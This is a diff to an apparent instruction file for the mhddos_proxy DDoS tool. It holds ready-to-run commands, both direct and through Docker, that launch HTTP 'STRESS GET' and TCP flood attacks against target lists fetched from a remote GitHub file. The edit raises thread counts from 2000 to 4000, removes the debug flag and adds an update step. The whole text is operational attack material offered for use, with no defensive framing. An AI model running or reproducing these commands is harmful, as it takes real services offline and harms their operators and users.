@@ -11,10 +11,10 @@ screen
 cd mhddos_proxy
 
 !!HTTP(L7):!!
-python3 runner.py -t 2000 --rpc 1000 --debug --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
+python3 runner.py -t 4000 --rpc 1000 --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
 
 !!TCP(L4):!!
-python3 runner.py -t 2000 --rpc 1000 --debug -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
+python3 runner.py -t 4000 --rpc 1000 -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
 
 
 
@@ -22,6 +22,10 @@ python3 runner.py -t 2000 --rpc 1000 --debug -c https://raw.githubusercontent.co
 
 !!SCRIPT FOR DOCKER (you need to setup Docker first!!!)
 
-docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --debug -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
+docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 4000 --rpc 1000 -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
 
-docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --debug -c --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
+docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 4000 --rpc 1000 -c --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
+
+
+!!UPDATE
+git pull https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
